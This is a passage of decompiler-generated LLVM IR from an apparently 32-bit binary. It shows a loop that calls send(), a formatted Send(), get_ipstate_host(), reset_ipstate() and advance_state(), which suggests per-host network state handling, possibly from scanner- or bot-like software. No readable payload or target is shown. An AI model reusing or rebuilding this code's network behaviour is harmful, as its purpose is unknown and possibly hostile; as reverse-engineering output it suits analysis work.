  store i32 %v0_8052b8a, i32* %v3_8052b8a, align 4
  %v4_8052b8b = call i32 @send(i32 %v2_805297b, i32 %stack_var_-644.1, i32 %stack_var_-640.1, i32 %v4_80529d5)
  store i32 %v4_8052b8b, i32* %eax.global-to-local, align 4
  %v0_8052b90 = load i32, i32* @esp, align 4
  %v2_8052b93 = icmp slt i32 %v4_8052b8b, 0
  %v1_8052b95 = icmp eq i1 %v2_8052b93, false
  br i1 %v1_8052b95, label %dec_label_pc_8052baf, label %dec_label_pc_8052b97

dec_label_pc_8052b97:                             ; preds = %dec_label_pc_8052b4e
  store i32 %v2_8051f36, i32* @edx, align 4
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v3_8052ba6 = inttoptr i32 %v0_8052b90 to i32*
  store i32 %v2_8051fcd, i32* %v3_8052ba6, align 4
  %v1_8052ba7 = call i32 @reset_ipstate(i32 %v2_805297b)
  store i32 %v1_8052ba7, i32* %eax.global-to-local, align 4
  %v0_8052bac = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052baf

dec_label_pc_8052baf:                             ; preds = %dec_label_pc_8052b4e, %dec_label_pc_8052b97
  %v0_8052a52111.in = phi i32 [ %v0_8052b90, %dec_label_pc_8052b4e ], [ %v0_8052bac, %dec_label_pc_8052b97 ]
  %v0_8052a52111 = add i32 %v0_8052a52111.in, 16
  %v4_8052baf = add nuw nsw i32 %storemerge372, 1
  store i32 %v4_8052baf, i32* %eax.global-to-local, align 4
  %exitcond106 = icmp eq i32 %v4_8052baf, %tmp14
  br i1 %exitcond106, label %dec_label_pc_8052bbe, label %dec_label_pc_8052a52

dec_label_pc_8052bbe:                             ; preds = %dec_label_pc_8052baf, %dec_label_pc_8052bb2.preheader
  %v0_8052bca = phi i32 [ %v0_8052971108, %dec_label_pc_8052bb2.preheader ], [ %v0_8052a52111, %dec_label_pc_8052baf ]
  %stack_var_-648.1.lcssa = phi i32 [ %stack_var_-648.383, %dec_label_pc_8052bb2.preheader ], [ %v2_805297b, %dec_label_pc_8052baf ]
  %stack_var_-644.2.lcssa = phi i32 [ %stack_var_-644.484, %dec_label_pc_8052bb2.preheader ], [ %stack_var_-644.1, %dec_label_pc_8052baf ]
  %stack_var_-640.2.lcssa = phi i32 [ %stack_var_-640.485, %dec_label_pc_8052bb2.preheader ], [ %stack_var_-640.1, %dec_label_pc_8052baf ]
  %storemerge3.lcssa = phi i32 [ 0, %dec_label_pc_8052bb2.preheader ], [ %tmp14, %dec_label_pc_8052baf ]
  store i32 %v2_8051f36, i32* @edx, align 4
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v1_8052bcd = add i32 %v0_8052bca, -12
  %v2_8052bcd = inttoptr i32 %v1_8052bcd to i32*
  store i32 8, i32* %v2_8052bcd, align 4
  %v0_8052bcf = load i32, i32* %eax.global-to-local, align 4
  %v2_8052bcf = add i32 %v0_8052bca, -16
  %v3_8052bcf = inttoptr i32 %v2_8052bcf to i32*
  store i32 %v0_8052bcf, i32* %v3_8052bcf, align 4
  %v2_8052bd0 = inttoptr i32 %storemerge3.lcssa to i32*
  %v3_8052bd0 = call i32 @advance_state(i32* %v2_8052bd0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8052bd0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_8052bdd:                             ; preds = %dec_label_pc_8051ff9
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8051fd2, align 16
  %v0_8052bf1 = load i32, i32* bitcast ([352 x i8]** @global_var_806f8b8.348 to i32*), align 8
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v5_8052bfb = inttoptr i32 %v0_8052bf1 to i8*
  %v1_8052c01 = and i32 %v0_8052bf1, -256
  store i32 %v1_8052c01, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v0_8052bf1, i32* @edi, align 4
  %v3_8052c0a = call i32 @_strlen(i8* %v5_8052bfb)
  store i32 %v3_8052c0a, i32* @ecx, align 4
  %v0_8052c13 = load i32, i32* bitcast ([352 x i8]** @global_var_806f8b8.348 to i32*), align 8
  store i32 %v0_8052c13, i32* @ebx, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v3_8052c22 = inttoptr i32 %v2_8051fcd to i32*
  %v4_8052c22 = load i32, i32* %v3_8052c22, align 16
  store i32 %v4_8052c22, i32* %eax.global-to-local, align 4
  %v0_8052c25 = load i32, i32* @esp, align 4
  %v1_8052c25 = add i32 %v0_8052c25, -4
  %v2_8052c25 = inttoptr i32 %v1_8052c25 to i32*
  store i32 16384, i32* %v2_8052c25, align 4
  %v0_8052c2a = load i32, i32* @ecx, align 4
  %v2_8052c2a = add i32 %v0_8052c25, -8
  %v3_8052c2a = inttoptr i32 %v2_8052c2a to i32*
  store i32 %v0_8052c2a, i32* %v3_8052c2a, align 4
  %v0_8052c2b = load i32, i32* @ebx, align 4
  %v2_8052c2b = add i32 %v0_8052c25, -12
  %v3_8052c2b = inttoptr i32 %v2_8052c2b to i32*
  store i32 %v0_8052c2b, i32* %v3_8052c2b, align 4
  %v0_8052c2c = load i32, i32* %eax.global-to-local, align 4
  %v2_8052c2c = add i32 %v0_8052c25, -16
  %v3_8052c2c = inttoptr i32 %v2_8052c2c to i32*
  store i32 %v0_8052c2c, i32* %v3_8052c2c, align 4
  %v5_8052c2d = call i32 @send(i32 %v0_8052bf1, i32 %stack_var_-648.383, i32 %stack_var_-644.484, i32 %stack_var_-640.485)
  %v0_8052c32 = load i32, i32* @esp, align 4
  %v2_8052c35 = icmp slt i32 %v5_8052c2d, 0
  %v1_8052c37 = icmp eq i1 %v2_8052c35, false
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  br i1 %v1_8052c37, label %dec_label_pc_8052cc1, label %dec_label_pc_8052c3d

dec_label_pc_8052c3d:                             ; preds = %dec_label_pc_8052bdd
  %v2_8052c46 = or i32 %v2_8051fca, 11
  %v3_8052c46 = add i32 %v2_8052c46, %v2_8051f36
  %v4_8052c46 = inttoptr i32 %v3_8052c46 to i8*
  %v5_8052c46 = load i8, i8* %v4_8052c46, align 1
  %v6_8052c46 = zext i8 %v5_8052c46 to i32
  store i32 %v6_8052c46, i32* %eax.global-to-local, align 4
  %v1_8052c4f = mul nuw nsw i32 %v6_8052c46, 4
  %v2_8052c4f = add nuw nsw i32 %v1_8052c4f, 134675744
  %v3_8052c4f = inttoptr i32 %v2_8052c4f to i32*
  %v4_8052c4f = load i32, i32* %v3_8052c4f, align 4
  store i32 %v4_8052c4f, i32* @ebx, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v2_8052c5f = or i32 %v2_8051fca, 10
  %v3_8052c5f = add i32 %v2_8052c5f, %v2_8051f36
  %v4_8052c5f = inttoptr i32 %v3_8052c5f to i8*
  %v5_8052c5f = load i8, i8* %v4_8052c5f, align 2
  %v6_8052c5f = zext i8 %v5_8052c5f to i32
  store i32 %v6_8052c5f, i32* %eax.global-to-local, align 4
  %v1_8052c68 = mul nuw nsw i32 %v6_8052c5f, 4
  %v2_8052c68 = add nuw nsw i32 %v1_8052c68, 134675328
  %v3_8052c68 = inttoptr i32 %v2_8052c68 to i32*
  %v4_8052c68 = load i32, i32* %v3_8052c68, align 4
  store i32 %v4_8052c68, i32* @esi, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v3_8052c7e = inttoptr i32 %v0_8052c32 to i32*
  store i32 %v2_8051fcd, i32* %v3_8052c7e, align 4
  %v0_8052c7f = call i32 @get_ipstate_host()
  store i32 %v0_8052c7f, i32* %eax.global-to-local, align 4
  %v0_8052c84 = load i32, i32* @esp, align 4
  %v0_8052c87 = load i32, i32* @global_var_807e56c.330, align 4
  store i32 %v0_8052c87, i32* %edx.global-to-local, align 4
  %v0_8052c90 = load i32, i32* @ebx, align 4
  %v2_8052c90 = add i32 %v0_8052c84, 4
  %v3_8052c90 = inttoptr i32 %v2_8052c90 to i32*
  store i32 %v0_8052c90, i32* %v3_8052c90, align 4
  %v0_8052c91 = load i32, i32* @esi, align 4
  %v3_8052c91 = inttoptr i32 %v0_8052c84 to i32*
  store i32 %v0_8052c91, i32* %v3_8052c91, align 4
  %v2_8052c92 = add i32 %v0_8052c84, -4
  %v3_8052c92 = inttoptr i32 %v2_8052c92 to i32*
  store i32 %v0_8052c7f, i32* %v3_8052c92, align 4
  %v0_8052c93 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052c93 = add i32 %v0_8052c84, -8
  %v3_8052c93 = inttoptr i32 %v2_8052c93 to i32*
  store i32 %v0_8052c93, i32* %v3_8052c93, align 4
  %v1_8052c94 = add i32 %v0_8052c84, -12
  %v2_8052c94 = inttoptr i32 %v1_8052c94 to i32*
  store i32 ptrtoint ([45 x i8]* @global_var_806a42c.349 to i32), i32* %v2_8052c94, align 4
  %v5_8052c99 = add i32 %v0_8052c84, -16
  %v6_8052c99 = inttoptr i32 %v5_8052c99 to i32*
  store i32 %arg3, i32* %v6_8052c99, align 4
  %v3_8052c9c = call i32 @Send(i32 %v0_8052bf1, i32 %stack_var_-648.383)
  %v0_8052ca1 = load i32, i32* @esp, align 4
  store i32 %v2_8051f36, i32* @edx, align 4
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v2_8052cb3 = add i32 %v0_8052ca1, 16
  %v3_8052cb3 = inttoptr i32 %v2_8052cb3 to i32*
  store i32 %v2_8051fcd, i32* %v3_8052cb3, align 4
  %v2_8052cb4 = call i32 @reset_ipstate(i32 %v0_8052bf1)
  store i32 %v2_8052cb4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_8052cc1:                             ; preds = %dec_label_pc_8052bdd
  store i32 %v1_8051fcf, i32* %eax.global-to-local, align 4
  %v2_8052ccf = load i32, i32* %v1_8051fd2, align 16
  store i32 %v2_8052ccf, i32* %eax.global-to-local, align 4
  %v1_8052cd1 = add i32 %v2_8052ccf, 10
  store i32 %v1_8052cd1, i32* @ebx, align 4
  %v2_8052cd7 = inttoptr i32 %v0_8052c32 to i32*
  store i32 0, i32* %v2_8052cd7, align 4
  %tmp61 = inttoptr i32 %v0_8052bf1 to i32*
  %v3_8052cd9 = call i32 @__GI_time(i32* %tmp61)
  store i32 %v3_8052cd9, i32* %eax.global-to-local, align 4
  %v0_8052ce1 = load i32, i32* @ebx, align 4
  %v7_8052ce1 = icmp ult i32 %v0_8052ce1, %v3_8052cd9
  %v1_8052ce3 = icmp eq i1 %v7_8052ce1, false
  br i1 %v1_8052ce3, label %dec_label_pc_8052d64, label %dec_label_pc_8052ce5

dec_label_pc_8052ce5:                             ; preds = %dec_label_pc_8052cc1
  %v0_8052cde = load i32, i32* @esp, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v2_8052cee = or i32 %v2_8051fca, 11
  %v3_8052cee = add i32 %v2_8052cee, %v2_8051f36
  %v4_8052cee = inttoptr i32 %v3_8052cee to i8*
  %v5_8052cee = load i8, i8* %v4_8052cee, align 1
  %v6_8052cee = zext i8 %v5_8052cee to i32
  store i32 %v6_8052cee, i32* %eax.global-to-local, align 4
  %v1_8052cf7 = mul nuw nsw i32 %v6_8052cee, 4
  %v2_8052cf7 = add nuw nsw i32 %v1_8052cf7, 134675744
  %v3_8052cf7 = inttoptr i32 %v2_8052cf7 to i32*
  %v4_8052cf7 = load i32, i32* %v3_8052cf7, align 4
  store i32 %v4_8052cf7, i32* @ebx, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v2_8052d07 = or i32 %v2_8051fca, 10
  %v3_8052d07 = add i32 %v2_8052d07, %v2_8051f36
  %v4_8052d07 = inttoptr i32 %v3_8052d07 to i8*
  %v5_8052d07 = load i8, i8* %v4_8052d07, align 2
  %v6_8052d07 = zext i8 %v5_8052d07 to i32
  store i32 %v6_8052d07, i32* %eax.global-to-local, align 4
  %v1_8052d10 = mul nuw nsw i32 %v6_8052d07, 4
  %v2_8052d10 = add nuw nsw i32 %v1_8052d10, 134675328
  %v3_8052d10 = inttoptr i32 %v2_8052d10 to i32*
  %v4_8052d10 = load i32, i32* %v3_8052d10, align 4
  store i32 %v4_8052d10, i32* @esi, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v3_8052d26 = inttoptr i32 %v0_8052cde to i32*
  store i32 %v2_8051fcd, i32* %v3_8052d26, align 4
  %v0_8052d27 = call i32 @get_ipstate_host()
  store i32 %v0_8052d27, i32* %eax.global-to-local, align 4
  %v0_8052d2c = load i32, i32* @esp, align 4
  %v0_8052d2f = load i32, i32* @global_var_807e56c.330, align 4
  store i32 %v0_8052d2f, i32* %edx.global-to-local, align 4
  %v0_8052d38 = load i32, i32* @ebx, align 4
  %v2_8052d38 = add i32 %v0_8052d2c, 4
  %v3_8052d38 = inttoptr i32 %v2_8052d38 to i32*
  store i32 %v0_8052d38, i32* %v3_8052d38, align 4
  %v0_8052d39 = load i32, i32* @esi, align 4
  %v3_8052d39 = inttoptr i32 %v0_8052d2c to i32*
  store i32 %v0_8052d39, i32* %v3_8052d39, align 4
  %v2_8052d3a = add i32 %v0_8052d2c, -4
  %v3_8052d3a = inttoptr i32 %v2_8052d3a to i32*
  store i32 %v0_8052d27, i32* %v3_8052d3a, align 4
  %v0_8052d3b = load i32, i32* %edx.global-to-local, align 4
  %v2_8052d3b = add i32 %v0_8052d2c, -8
  %v3_8052d3b = inttoptr i32 %v2_8052d3b to i32*
  store i32 %v0_8052d3b, i32* %v3_8052d3b, align 4
  %v1_8052d3c = add i32 %v0_8052d2c, -12
  %v2_8052d3c = inttoptr i32 %v1_8052d3c to i32*
  store i32 ptrtoint ([53 x i8]* @global_var_806a45c.350 to i32), i32* %v2_8052d3c, align 4
  %v5_8052d41 = add i32 %v0_8052d2c, -16
  %v6_8052d41 = inttoptr i32 %v5_8052d41 to i32*
  store i32 %arg3, i32* %v6_8052d41, align 4
  %v3_8052d44 = call i32 @Send(i32 %v0_8052bf1, i32 %stack_var_-648.383)
  %v0_8052d49 = load i32, i32* @esp, align 4
  store i32 %v2_8051f36, i32* @edx, align 4
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v2_8052d5b = add i32 %v0_8052d49, 16
  %v3_8052d5b = inttoptr i32 %v2_8052d5b to i32*
  store i32 %v2_8051fcd, i32* %v3_8052d5b, align 4
  %v2_8052d5c = call i32 @reset_ipstate(i32 %v0_8052bf1)
  store i32 %v2_8052d5c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_8052d64:                             ; preds = %dec_label_pc_8051ff9, %dec_label_pc_8052cc1, %dec_label_pc_805290c, %dec_label_pc_8052652, %dec_label_pc_8052488, %dec_label_pc_80523ab, %dec_label_pc_805210e, %dec_label_pc_8052c3d, %dec_label_pc_8052bbe, %dec_label_pc_8052934, %dec_label_pc_80528ef, %dec_label_pc_8052869, %dec_label_pc_805284a, %dec_label_pc_80527f6, %dec_label_pc_8052765, %dec_label_pc_8052748, %dec_label_pc_8052706, %dec_label_pc_805267a, %dec_label_pc_8052633, %dec_label_pc_8052614, %dec_label_pc_805259b, %dec_label_pc_805257e, %dec_label_pc_805253c, %dec_label_pc_80524b0, %dec_label_pc_8052469, %dec_label_pc_805244a, %dec_label_pc_80523d3, %dec_label_pc_805238e, %dec_label_pc_805232d, %dec_label_pc_8052310, %dec_label_pc_805221b, %dec_label_pc_80521fe, %dec_label_pc_80520bf, %dec_label_pc_8052ce5
  %stack_var_-648.2 = phi i32 [ %stack_var_-648.383, %dec_label_pc_8051ff9 ], [ %stack_var_-648.383, %dec_label_pc_8052cc1 ], [ %stack_var_-648.383, %dec_label_pc_8052ce5 ], [ %stack_var_-648.383, %dec_label_pc_8052c3d ], [ %stack_var_-648.1.lcssa, %dec_label_pc_8052bbe ], [ %stack_var_-648.383, %dec_label_pc_805290c ], [ %stack_var_-648.383, %dec_label_pc_8052934 ], [ %stack_var_-648.383, %dec_label_pc_80528ef ], [ %stack_var_-648.383, %dec_label_pc_8052869 ], [ %stack_var_-648.383, %dec_label_pc_805284a ], [ %stack_var_-648.383, %dec_label_pc_80527f6 ], [ %stack_var_-648.383, %dec_label_pc_8052765 ], [ %stack_var_-648.383, %dec_label_pc_8052748 ], [ %stack_var_-648.383, %dec_label_pc_8052706 ], [ %stack_var_-648.383, %dec_label_pc_8052652 ], [ %stack_var_-648.383, %dec_label_pc_805267a ], [ %stack_var_-648.383, %dec_label_pc_8052633 ], [ %stack_var_-648.383, %dec_label_pc_8052614 ], [ %stack_var_-648.383, %dec_label_pc_805259b ], [ %stack_var_-648.383, %dec_label_pc_805257e ], [ %stack_var_-648.383, %dec_label_pc_805253c ], [ %stack_var_-648.383, %dec_label_pc_8052488 ], [ %stack_var_-648.383, %dec_label_pc_80524b0 ], [ %stack_var_-648.383, %dec_label_pc_8052469 ], [ %stack_var_-648.383, %dec_label_pc_805244a ], [ %stack_var_-648.383, %dec_label_pc_80523ab ], [ %stack_var_-648.383, %dec_label_pc_80523d3 ], [ %stack_var_-648.383, %dec_label_pc_805238e ], [ %stack_var_-648.383, %dec_label_pc_805232d ], [ %stack_var_-648.383, %dec_label_pc_8052310 ], [ %stack_var_-648.383, %dec_label_pc_805210e ], [ %stack_var_-648.383, %dec_label_pc_805221b ], [ %stack_var_-648.383, %dec_label_pc_80521fe ], [ %stack_var_-648.383, %dec_label_pc_80520bf ]
  %stack_var_-644.3 = phi i32 [ %stack_var_-644.484, %dec_label_pc_8051ff9 ], [ %stack_var_-644.484, %dec_label_pc_8052cc1 ], [ %stack_var_-644.484, %dec_label_pc_8052ce5 ], [ %stack_var_-644.484, %dec_label_pc_8052c3d ], [ %stack_var_-644.2.lcssa, %dec_label_pc_8052bbe ], [ %stack_var_-644.484, %dec_label_pc_805290c ], [ %stack_var_-644.484, %dec_label_pc_8052934 ], [ %stack_var_-644.484, %dec_label_pc_80528ef ], [ %stack_var_-644.484, %dec_label_pc_8052869 ], [ %stack_var_-644.484, %dec_label_pc_805284a ], [ %stack_var_-644.484, %dec_label_pc_80527f6 ], [ %stack_var_-644.484, %dec_label_pc_8052765 ], [ %stack_var_-644.484, %dec_label_pc_8052748 ], [ %stack_var_-644.484, %dec_label_pc_8052706 ], [ %stack_var_-644.484, %dec_label_pc_8052652 ], [ %stack_var_-644.484, %dec_label_pc_805267a ], [ %stack_var_-644.484, %dec_label_pc_8052633 ], [ %stack_var_-644.484, %dec_label_pc_8052614 ], [ %stack_var_-644.484, %dec_label_pc_805259b ], [ %stack_var_-644.484, %dec_label_pc_805257e ], [ %stack_var_-644.484, %dec_label_pc_805253c ], [ %stack_var_-644.484, %dec_label_pc_8052488 ], [ %stack_var_-644.484, %dec_label_pc_80524b0 ], [ %stack_var_-644.484, %dec_label_pc_8052469 ], [ %stack_var_-644.484, %dec_label_pc_805244a ], [ %stack_var_-644.484, %dec_label_pc_80523ab ], [ %stack_var_-644.484, %dec_label_pc_80523d3 ], [ %stack_var_-644.484, %dec_label_pc_805238e ], [ %stack_var_-644.484, %dec_label_pc_805232d ], [ %stack_var_-644.484, %dec_label_pc_8052310 ], [ %stack_var_-644.484, %dec_label_pc_805210e ], [ %stack_var_-644.484, %dec_label_pc_805221b ], [ %stack_var_-644.484, %dec_label_pc_80521fe ], [ %stack_var_-644.484, %dec_label_pc_80520bf ]
  %stack_var_-640.3 = phi i32 [ %stack_var_-640.485, %dec_label_pc_8051ff9 ], [ %stack_var_-640.485, %dec_label_pc_8052cc1 ], [ %stack_var_-640.485, %dec_label_pc_8052ce5 ], [ %stack_var_-640.485, %dec_label_pc_8052c3d ], [ %stack_var_-640.2.lcssa, %dec_label_pc_8052bbe ], [ %stack_var_-640.485, %dec_label_pc_805290c ], [ %stack_var_-640.485, %dec_label_pc_8052934 ], [ %stack_var_-640.485, %dec_label_pc_80528ef ], [ %stack_var_-640.485, %dec_label_pc_8052869 ], [ %stack_var_-640.485, %dec_label_pc_805284a ], [ %stack_var_-640.485, %dec_label_pc_80527f6 ], [ %stack_var_-640.485, %dec_label_pc_8052765 ], [ %stack_var_-640.485, %dec_label_pc_8052748 ], [ %stack_var_-640.485, %dec_label_pc_8052706 ], [ %stack_var_-640.485, %dec_label_pc_8052652 ], [ %stack_var_-640.485, %dec_label_pc_805267a ], [ %stack_var_-640.485, %dec_label_pc_8052633 ], [ %stack_var_-640.485, %dec_label_pc_8052614 ], [ %stack_var_-640.485, %dec_label_pc_805259b ], [ %stack_var_-640.485, %dec_label_pc_805257e ], [ %stack_var_-640.485, %dec_label_pc_805253c ], [ %stack_var_-640.485, %dec_label_pc_8052488 ], [ %stack_var_-640.485, %dec_label_pc_80524b0 ], [ %stack_var_-640.485, %dec_label_pc_8052469 ], [ %stack_var_-640.485, %dec_label_pc_805244a ], [ %stack_var_-640.485, %dec_label_pc_80523ab ], [ %stack_var_-640.485, %dec_label_pc_80523d3 ], [ %stack_var_-640.485, %dec_label_pc_805238e ], [ %stack_var_-640.485, %dec_label_pc_805232d ], [ %stack_var_-640.485, %dec_label_pc_8052310 ], [ %stack_var_-640.485, %dec_label_pc_805210e ], [ %stack_var_-640.485, %dec_label_pc_805221b ], [ %stack_var_-640.485, %dec_label_pc_80521fe ], [ %stack_var_-640.485, %dec_label_pc_80520bf ]
  %stack_var_-628.1 = phi i32 [ %stack_var_-628.288, %dec_label_pc_8051ff9 ], [ %stack_var_-628.288, %dec_label_pc_8052cc1 ], [ %stack_var_-628.288, %dec_label_pc_8052ce5 ], [ %stack_var_-628.288, %dec_label_pc_8052c3d ], [ %stack_var_-628.288, %dec_label_pc_8052bbe ], [ %stack_var_-628.288, %dec_label_pc_805290c ], [ %stack_var_-628.288, %dec_label_pc_8052934 ], [ %stack_var_-628.288, %dec_label_pc_80528ef ], [ %stack_var_-628.288, %dec_label_pc_8052869 ], [ %stack_var_-628.288, %dec_label_pc_805284a ], [ %stack_var_-628.288, %dec_label_pc_80527f6 ], [ %v4_80526a9, %dec_label_pc_8052765 ], [ %v4_80526a9, %dec_label_pc_8052748 ], [ %v4_80526a9, %dec_label_pc_8052706 ], [ %stack_var_-628.288, %dec_label_pc_8052652 ], [ %stack_var_-628.288, %dec_label_pc_805267a ], [ %stack_var_-628.288, %dec_label_pc_8052633 ], [ %stack_var_-628.288, %dec_label_pc_8052614 ], [ %stack_var_-628.288, %dec_label_pc_805259b ], [ %stack_var_-628.288, %dec_label_pc_805257e ], [ %stack_var_-628.288, %dec_label_pc_805253c ], [ %stack_var_-628.288, %dec_label_pc_8052488 ], [ %stack_var_-628.288, %dec_label_pc_80524b0 ], [ %stack_var_-628.288, %dec_label_pc_8052469 ], [ %stack_var_-628.288, %dec_label_pc_805244a ], [ %stack_var_-628.288, %dec_label_pc_80523ab ], [ %stack_var_-628.288, %dec_label_pc_80523d3 ], [ %stack_var_-628.288, %dec_label_pc_805238e ], [ %stack_var_-628.288, %dec_label_pc_805232d ], [ %stack_var_-628.288, %dec_label_pc_8052310 ], [ %stack_var_-628.288, %dec_label_pc_805210e ], [ %stack_var_-628.288, %dec_label_pc_805221b ], [ %stack_var_-628.288, %dec_label_pc_80521fe ], [ %stack_var_-628.288, %dec_label_pc_80520bf ]
  %stack_var_-624.1 = phi i32 [ %stack_var_-624.289, %dec_label_pc_8051ff9 ], [ %stack_var_-624.289, %dec_label_pc_8052cc1 ], [ %stack_var_-624.289, %dec_label_pc_8052ce5 ], [ %stack_var_-624.289, %dec_label_pc_8052c3d ], [ %stack_var_-624.289, %dec_label_pc_8052bbe ], [ %stack_var_-624.289, %dec_label_pc_805290c ], [ %stack_var_-624.289, %dec_label_pc_8052934 ], [ %stack_var_-624.289, %dec_label_pc_80528ef ], [ %stack_var_-624.289, %dec_label_pc_8052869 ], [ %stack_var_-624.289, %dec_label_pc_805284a ], [ %stack_var_-624.289, %dec_label_pc_80527f6 ], [ %stack_var_-624.289, %dec_label_pc_8052765 ], [ %stack_var_-624.289, %dec_label_pc_8052748 ], [ %stack_var_-624.289, %dec_label_pc_8052706 ], [ %stack_var_-624.289, %dec_label_pc_8052652 ], [ %stack_var_-624.289, %dec_label_pc_805267a ], [ %stack_var_-624.289, %dec_label_pc_8052633 ], [ %stack_var_-624.289, %dec_label_pc_8052614 ], [ %v4_80524df, %dec_label_pc_805259b ], [ %v4_80524df, %dec_label_pc_805257e ], [ %v4_80524df, %dec_label_pc_805253c ], [ %stack_var_-624.289, %dec_label_pc_8052488 ], [ %stack_var_-624.289, %dec_label_pc_80524b0 ], [ %stack_var_-624.289, %dec_label_pc_8052469 ], [ %stack_var_-624.289, %dec_label_pc_805244a ], [ %stack_var_-624.289, %dec_label_pc_80523ab ], [ %stack_var_-624.289, %dec_label_pc_80523d3 ], [ %stack_var_-624.289, %dec_label_pc_805238e ], [ %stack_var_-624.289, %dec_label_pc_805232d ], [ %stack_var_-624.289, %dec_label_pc_8052310 ], [ %stack_var_-624.289, %dec_label_pc_805210e ], [ %stack_var_-624.289, %dec_label_pc_805221b ], [ %stack_var_-624.289, %dec_label_pc_80521fe ], [ %stack_var_-624.289, %dec_label_pc_80520bf ]
  %v4_8052d64 = add nuw nsw i32 %storemerge90, 1
  store i32 %v4_8052d64, i32* %eax.global-to-local, align 4
  %v5_8052d6d = icmp slt i32 %v4_8052d64, %stack_var_-56.0
  br i1 %v5_8052d6d, label %dec_label_pc_8051fc4, label %dec_label_pc_8051fb8

dec_label_pc_8052d78:                             ; preds = %entry
  %v2_8052d81 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8052d81, i32* @ebx, align 4
  store i32 %v0_8051e36, i32* @esi, align 4
  store i32 %v0_8051e35, i32* @edi, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_8052d64, { 2, 1, 0 }
  uselistorder i32 %stack_var_-624.1, { 1, 0 }
  uselistorder i32 %stack_var_-628.1, { 1, 0 }
  uselistorder i32 %stack_var_-640.3, { 1, 0 }
  uselistorder i32 %stack_var_-644.3, { 1, 0 }
  uselistorder i32 %stack_var_-648.2, { 1, 0 }
  uselistorder i32 %v0_8052bca, { 1, 0 }
  uselistorder i32 %v4_8052baf, { 1, 2, 0 }
  uselistorder i32 %v0_8052a52111, { 1, 0 }
  uselistorder i32 %stack_var_-640.1, { 0, 2, 1 }
  uselistorder i32 %stack_var_-644.1, { 0, 2, 1 }
  uselistorder i32 %v4_8052b0e, { 0, 2, 3, 4, 5, 1, 6 }
  uselistorder i32 %storemerge372, { 7, 8, 6, 5, 4, 2, 3, 1, 0 }
  uselistorder i32 %v0_8052a52, { 2, 1, 0 }
  uselistorder i32 %v0_8052971108, { 2, 1, 0 }
  uselistorder i32 %v4_80529d5, { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32 %v4_8052997, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %storemerge562, { 5, 4, 3, 1, 2, 0 }
  uselistorder i32 %v0_8052971, { 2, 1, 0 }
  uselistorder i32 %v0_805282e, { 1, 2, 3, 0 }
  uselistorder i32 %v0_80527ef, { 1, 2, 0 }
  uselistorder i32 %v0_8052741, { 1, 0, 2 }
  uselistorder i32 %v0_80526ff, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_80526a9, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_8052642, { 1, 0 }
  uselistorder i32 %v0_805260d, { 1, 2, 0 }
  uselistorder i32 %v0_8052577, { 1, 0, 2 }
  uselistorder i32 %v0_8052535, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_80524df, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_8052478, { 1, 0 }
  uselistorder i32 %v0_8052443, { 1, 2, 0 }
  uselistorder i32 %v0_8052366, { 1, 0 }
  uselistorder i32 %v13_805234b, { 1, 0 }
  uselistorder i32 %v0_8052346, { 2, 0, 1 }
  uselistorder i32 %v0_80522b8, { 0, 1, 6, 2, 3, 4, 5 }
  uselistorder i32 %v5_80522b3, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v1_8052270, { 1, 0 }
  uselistorder i32 %v2_8052261, { 1, 0 }
  uselistorder i32 %v0_8052227, { 1, 0 }
  uselistorder i32 %v0_80521c9, { 2, 0, 1 }
  uselistorder i32 %v12_80521ae, { 1, 0 }
  uselistorder i32 %v0_80521a9, { 2, 0, 1 }
  uselistorder i32 %v2_8052152, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v1_805214f, { 1, 0 }
  uselistorder i32 %v0_8052141, { 2, 0, 1 }
  uselistorder i32 %v1_8052096, { 1, 0 }
  uselistorder i32 %v2_805204e, { 1, 0 }
  uselistorder i32 %v6_8052002, { 9, 10, 8, 6, 7, 5, 3, 4, 2, 1, 12, 11, 13, 0 }
  uselistorder i32* %v1_8051fd2, { 6, 7, 5, 3, 4, 2, 1, 0, 8 }
  uselistorder i32 %v1_8051fcf, { 4, 3, 2, 1, 0, 5, 6 }
